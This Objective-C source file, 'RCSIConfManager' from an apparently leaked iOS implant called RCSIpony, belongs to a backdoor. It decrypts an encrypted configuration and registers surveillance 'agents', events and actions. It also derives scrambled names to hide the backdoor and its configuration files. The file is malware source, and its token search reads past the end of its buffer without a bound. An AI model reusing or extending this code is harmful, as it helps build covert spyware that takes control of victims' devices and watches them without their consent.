/*
 * RCSIpony - ConfiguraTor(i)
 *  This class will be responsible for all the required operations on the 
 *  configuration file.
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 21/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <sys/types.h>
#import <CommonCrypto/CommonDigest.h>

#import "RCSIConfManager.h"
#import "RCSITaskManager.h"
#import "RCSIEncryption.h"
#import "RCSICommon.h"
#import "RCSIUtils.h"

#define JSON_CONFIG

#ifdef JSON_CONFIG
#import "RCSIJSonConfiguration.h"
#endif

#define DEBUG_

#pragma mark -
#pragma mark Configurator Struct Definition
#pragma mark -
//
// Definitions of all the struct filled in by the Configurator
//
typedef struct _configuration {
  u_int confID;
  u_int internalDataSize;
  NSData *internalData;
} configurationStruct;

typedef struct _agent {
  u_int   agentID;
  u_int   status;  // Running, Stopped
  u_int   internalDataSize;
  //void *pParams;
  NSData  *internalData;
  void    *pFunc;        // Thread start routine
  u_int   command;
} agentStruct;

typedef struct _event {
  u_int   type;
  u_int   actionID;
  u_int   internalDataSize;
  NSData  *internalData;
  void    *pFunc;
  u_int   status;
  u_int   command;     // Used for communicate within the monitor
} eventStruct;

typedef struct _action {
  u_int   type;
  u_int   internalDataSize;
  NSData  *internalData;
} actionStruct;

typedef struct _actionContainer {
  u_int numberOfSubActions;
} actionContainerStruct;

typedef struct _eventConf {
  u_int   numberOfEvents;
  NSData  *internalData;
} eventConfStruct;

#pragma mark -
#pragma mark Private Interface
#pragma mark -

@interface RCSIConfManager (hidden)

- (BOOL)_searchDataForToken: (NSData *)data
                      token: (char *)token
                   position: (u_long *)outPosition;

- (u_int)_parseEvents: (NSData *)aData nTimes: (int)nTimes;
- (BOOL)_parseActions: (NSData *)aData nTimes: (int)nTimes;
- (u_int)_parseAgents: (NSData *)aData nTimes: (int)nTimes;
- (BOOL)_parseConfiguration: (NSData *)aData nItems: (int)nItems;

@end

#pragma mark -
#pragma mark Private Implementation
#pragma mark -

@implementation RCSIConfManager (hidden)

- (BOOL)_searchDataForToken: (NSData *)data
                      token: (char *)token
                   position: (u_long *)outPosition
{
  u_long counter = 0;
  
  for (;;)
    { 
      if (!strcmp((char *)[data bytes] + counter, token))
        {
          *(outPosition) = counter;
          return YES;
        }
      
      counter += 1;
    }
  
  return NO;
}

//
// Quick Note
//  After the event section there all the raw actions, thus we need to call
//  the parseActions right after this /* No comment */
//
- (u_int)_parseEvents: (NSData *)aData nTimes: (int)nTimes
{
  eventStruct *header;
  NSData *rawHeader;
  int i;
  u_int pos = 0;
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(eventStruct)];
      
      header = (eventStruct *)[rawHeader bytes];

#ifdef DEBUG_VERBOSE_1
      NSLog(@"event size: %x", header->internalDataSize);
      NSLog(@"event type: %x", header->type);
#endif
      
      if (header->internalDataSize)
        {
          NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
                                            length: header->internalDataSize];
          //NSLog(@"%@", tempData);
          
          [taskManager registerEvent: tempData
                                type: header->type
                              action: header->actionID];
        }
      else
        [taskManager registerEvent: nil
                              type: header->type
                            action: header->actionID];
      
      // Jump to the next event (dataSize + PAD)
      pos += header->internalDataSize + 0xC;
      //NSLog(@"pos %x", pos);
    }
  
  return pos + 0x10;
}

- (BOOL)_parseActions: (NSData *)aData nTimes: (int)nTimes
{
  actionContainerStruct *headerContainer;
  actionStruct *header;
  NSData *rawHeader;
  int i, z;
  u_int pos = 0;
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {      
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(actionContainerStruct)];
      headerContainer = (actionContainerStruct *)[rawHeader bytes];
      pos += sizeof(actionContainerStruct);
      
#ifdef DEBUG_VERBOSE_1
      NSLog(@"number of subactions: %d", headerContainer->numberOfSubActions);
#endif

      for (z = 0; z < headerContainer->numberOfSubActions; z++)
        {
          rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                     length: sizeof(actionStruct)];
          header = (actionStruct *)[rawHeader bytes];
          
#ifdef DEBUG_VERBOSE_1
          NSLog(@"RAW Header: %@", rawHeader);
          NSLog(@"action type: %x", header->type);
          NSLog(@"action size: %x", header->internalDataSize);
#endif
          if (header->internalDataSize > 0)
            {
              NSData *tempData = [NSData dataWithBytes: [aData bytes] + pos + 0x8
                                                length: header->internalDataSize];
#ifdef DEBUG_VERBOSE_1
              NSLog(@"%@", tempData);
#endif
              pos += header->internalDataSize + 0x8;
              
              [taskManager registerAction: tempData
                                     type: header->type
                                   action: i];
            }
          else
            {
              [taskManager registerAction: nil
                                     type: header->type
                                   action: i];
              
              pos += sizeof(int) << 1;
            }
        }
    }
  
  return YES;
}

- (u_int)_parseAgents: (NSData *)aData nTimes: (int)nTimes
{
  agentStruct *header;
  NSData *rawHeader, *tempData;
  int i;
  u_int pos = 0;
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  for (i = 0; i < nTimes; i++)
    {
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof(agentStruct)];
      header = (agentStruct *)[rawHeader bytes];
    
#ifdef DEBUG_VERBOSE_1
      NSLog(@"agent ID: %x with Status %d", header->agentID, header->status);
      NSLog(@"agent size: %x", header->internalDataSize);
#endif
    
#ifdef DEBUG_VERBOSE_1
    if (header->agentID == AGENT_DEVICE)
      NSLog(@"%s: AGENT DEVICE raw header %@", __FUNCTION__, rawHeader);
#endif 
    
      if (header->internalDataSize)
        {
          // Workaround for re-run agent DEVICE every sync
          if (header->agentID == AGENT_DEVICE)
            {
              deviceStruct tmpDevice;
              
              if (header->status == 2)
                tmpDevice.isEnabled = AGENT_DEV_ENABLED;
              else
                tmpDevice.isEnabled = AGENT_DEV_NOTENABLED;
              
              tempData = [NSData dataWithBytes: &tmpDevice length: sizeof(deviceStruct)];
              
              memcpy((void*)[tempData bytes], (void*)[aData bytes] + pos + 0xC, sizeof(UInt32)); 
          
#ifdef DEBUG_VERBOSE_1
              NSLog(@"%s: AGENT DEVICE additional header %@", __FUNCTION__, tempData);
#endif
            }
          else
            {
              tempData = [NSData dataWithBytes: [aData bytes] + pos + 0xC
                                        length: header->internalDataSize];
            }
        
          pos += header->internalDataSize + 0xC;
          
          [taskManager registerAgent: tempData
                             agentID: header->agentID
                              status: header->status];
        }
      else
        {
          pos += 0xC;
          
          [taskManager registerAgent: nil
                             agentID: header->agentID
                              status: header->status];
        }
      
      //NSLog(@"pos %x", pos);
    }
  
  return pos + 0x10;
}

- (BOOL)_parseConfiguration: (NSData *)aData nItems: (int)nItems
{
  configurationStruct *header;
  NSData *rawHeader;
  int i;
  u_int pos = 0;
  
  for (i = 0; i < nItems; i++)
    {
      rawHeader = [NSData dataWithBytes: [aData bytes] + pos
                                 length: sizeof (configurationStruct)];
      
      header = (configurationStruct *)[rawHeader bytes];
      
      if (header->internalDataSize)
        {
          mGlobalConfiguration = [[NSData alloc] initWithBytes: [aData bytes] + pos
                                                        length: header->internalDataSize];
#ifdef DEBUG
          NSLog(@"internal Mobile Conf Data: %@", mGlobalConfiguration);
#endif
          pos += header->internalDataSize;
        }
    }
  
  return TRUE;
}

@end

#pragma mark -
#pragma mark Public Implementation
#pragma mark -

@implementation RCSIConfManager

@synthesize mGlobalConfiguration, mBackdoorName, mBackdoorUpdateName;

- (id)initWithBackdoorName: (NSString *)aName
{
  self = [super init];
  
  if (self != nil)
    {
#ifdef DEV_MODE
      unsigned char result[CC_MD5_DIGEST_LENGTH];
      CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
      
      NSData *temp = [NSData dataWithBytes: result
                                    length: CC_MD5_DIGEST_LENGTH];
#else
      NSData *temp = [NSData dataWithBytes: gConfAesKey
                                    length: CC_MD5_DIGEST_LENGTH];
#endif
      
      mEncryption = [[RCSIEncryption alloc] initWithKey: temp];
      
      mBackdoorName = [aName copy];
      
      //
      // Here we should calculate the lowest scrambled name in order to obtain
      // the configuration name
      //
      mBackdoorUpdateName = [mEncryption scrambleForward: mBackdoorName
                                                    seed: ALPHABET_LEN / 2];
#ifdef DEBUG      
      NSLog(@"backdoorUpdateName (/2): %@", mBackdoorUpdateName);
      NSString *tempA = [mEncryption scrambleForward: mBackdoorUpdateName
                                                seed: 1];
      NSLog(@"backdoorUpdateName (+1): %@", tempA);
#endif
      if ([mBackdoorName intValue] < [mBackdoorUpdateName intValue])
        mConfigurationName = [mEncryption scrambleForward: mBackdoorName
                                                     seed: 1];
      else
        mConfigurationName = [mEncryption scrambleForward: mBackdoorUpdateName
                                                     seed: 1];
#ifdef DEBUG
      NSLog(@"[RCSMConfigurator] Configuration Name: %@", mConfigurationName);
      NSLog(@"[RCSMConfigurator] Configuration Name: %@", [mEncryption scrambleForward: mConfigurationName
                                                                                  seed: 1]);
#endif
    }
  
  return self;
}

- (void)dealloc
{
  [mEncryption release];
  [mBackdoorName release];
  
  [super dealloc];
}

- (id)delegate
{
  return mDelegate;
}

- (void)setDelegate: (id)aDelegate
{
  mDelegate = aDelegate;
}

- (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile
{
  BOOL rVal = NO;
  int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
  int endOfConfData;
  NSData *configuration;
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 
#ifdef JSON_CONFIG
  configuration = [mEncryption decryptJSonConfiguration: configurationFile];
#else
  configuration = [mEncryption decryptConfiguration: configurationFile];
#endif

  if (configuration == nil) 
  {
    [pool release];
    return NO;
  }
  
#ifdef JSON_CONFIG
  rVal = YES;
#else  
  [configuration getBytes: &endOfConfData
                    range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
  
  // Exclude sizeof(Final CRC) + sizeof(LEN field)
  endOfConfData = endOfConfData - sizeof(int) * 2;
  
  NSData *configurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
                                                                    endOfConfData)];
  
  u_long pos = 0;
  
  if ([self _searchDataForToken: configurationData
                          token: ENDOF_CONF_DELIMITER
                       position: &pos] == YES)
    rVal = YES;
  else 
    rVal = NO;

  [pool release];
#endif  
  
  return rVal;
}

- (BOOL)loadConfiguration
{
  NSString *configurationFile = gConfigurationName;
  
#ifdef JSON_CONFIG
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];

  if (configuration == nil)
      return NO;

  // For safety we remove all the previous objects
  [taskManager removeAllElements];

  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
  
  // Running the parser and populate the lists
  BOOL bRet =
  [jSonDel runParser: configuration 
          WithEvents: [taskManager mEventsList] 
          andActions: [taskManager mActionsList] 
          andModules: [taskManager mAgentsList]];
  
  [jSonDel release];
  [pool release];
  
  return bRet;
  
#else 
  int numberOfOccurrences;
  
  //
  // Decrypt the configuration file data
  //
  NSData *configuration = [mEncryption decryptConfiguration: configurationFile];
  
  if (configuration != nil)
    {
      RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
      
      //
      // For safety we remove all the previous objects
      //
      [taskManager removeAllElements];
      
#ifdef DEBUG_VERBOSE_1
      [configuration writeToFile: @"/tmp/conf_decrypted.bin"
                      atomically: YES];
#endif
      
      int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
      int endOfConfData;
      
      [configuration getBytes: &endOfConfData
                        range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
      
      // Exclude sizeof(Final CRC) + sizeof(LEN field)
      endOfConfData = endOfConfData - sizeof(int) * 2;
      
      mConfigurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
                                                                        endOfConfData)];
      
      u_long pos = 0;
      int offsetActions = 0;
      
      if ([self _searchDataForToken: mConfigurationData
                              token: EVENT_CONF_DELIMITER
                           position: &pos] == YES)
        {
          // Skip the EVENT Token + \00
          pos += strlen(EVENT_CONF_DELIMITER) + 1;
          
          //
          // Read num of events
          //
          [mConfigurationData getBytes: &numberOfOccurrences
                                 range: NSMakeRange(pos, sizeof(int))];
#ifdef DEBUG
          NSLog(@"Parsing (%d) Events at offset (%x)", numberOfOccurrences, pos);
#endif
          // Skip numberOfEvents (DWORD)
          pos += sizeof(int);
          NSData *tempData = [mConfigurationData subdataWithRange:
                              NSMakeRange(pos, endOfConfData - pos)];
          
          //
          // Parse events - returns the fileoffset for actions
          // since there's no token
          //
          offsetActions = [self _parseEvents: tempData
                                      nTimes: numberOfOccurrences];
        }
      else
        {
          // TODO: Handle the error from searchDataForToken
#ifdef DEBUG
          NSLog(@"event - searchDataForToken sux");
#endif
          return NO;
        }
      
#ifdef DEBUG_VERBOSE_1
      NSLog(@"Offset: %x", offsetActions);
#endif
      // Read num of actions
      [mConfigurationData getBytes: &numberOfOccurrences
                             range: NSMakeRange(offsetActions, sizeof(int))];
#ifdef DEBUG
      NSLog(@"Parsing (%d) Actions at offset (%x)", numberOfOccurrences, offsetActions);
#endif
      // Skip numberOfActions (DWORD)
      offsetActions += sizeof(int);
      
      NSData *tempData = [mConfigurationData subdataWithRange:
                          NSMakeRange(offsetActions,
                                      endOfConfData - offsetActions)];

      //NSLog(@"actions %@", tempData);

      //
      // Parse actions here since our wonderful/functional/flexible/extendible
      // configuration file doesn't have an action header, obfuscation FTW
      //
      [self _parseActions: tempData
                   nTimes: numberOfOccurrences];
      
      if ([self _searchDataForToken: mConfigurationData
                              token: AGENT_CONF_DELIMITER
                           position: &pos] == YES)
        {
          // Skip the EVENT Token + \00
          pos += strlen(AGENT_CONF_DELIMITER) + 1;
          
          //
          // Read num of agents
          //
          [mConfigurationData getBytes: &numberOfOccurrences
                                 range: NSMakeRange(pos, sizeof(int))];
#ifdef DEBUG
          NSLog(@"Parsing (%d) Agents at offset (%x)", numberOfOccurrences, pos);
#endif
          // Skip numberOfAgents (DWORD)
          pos += sizeof(int);
          NSData *tempData = [mConfigurationData subdataWithRange:
                              NSMakeRange(pos,
                                          endOfConfData - pos)];
          
          //
          // Parse agents
          //
          [self _parseAgents: tempData nTimes: numberOfOccurrences];
        }
      else
        {
          // TODO: Handle the error from searchDataForToken
#ifdef DEBUG
          NSLog(@"agents - searchDataForToken sux");
#endif
          return NO;
        }
      
      if ([self _searchDataForToken: mConfigurationData
                              token: MOBILE_CONF_DELIMITER
                           position: &pos] == YES)
        {
          // Skip the MOBILE Token + \00
          pos += strlen(MOBILE_CONF_DELIMITER) + 1;
          
          // TODO
        }
      else
        {
#ifdef DEBUG
          NSLog(@"mobile conf - searchDataForToken sux");
#endif
          return NO;
        }
          
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error while decrypting configuration");
#endif
      
      return NO;
    }

#endif
 
  return YES;
}

- (RCSIEncryption *)encryption
{
  return mEncryption;
}

- (NSString *)backdoorName
{
  return mBackdoorName;
}

- (NSString *)backdoorUpdateName
{
  return mBackdoorUpdateName;
}

@end
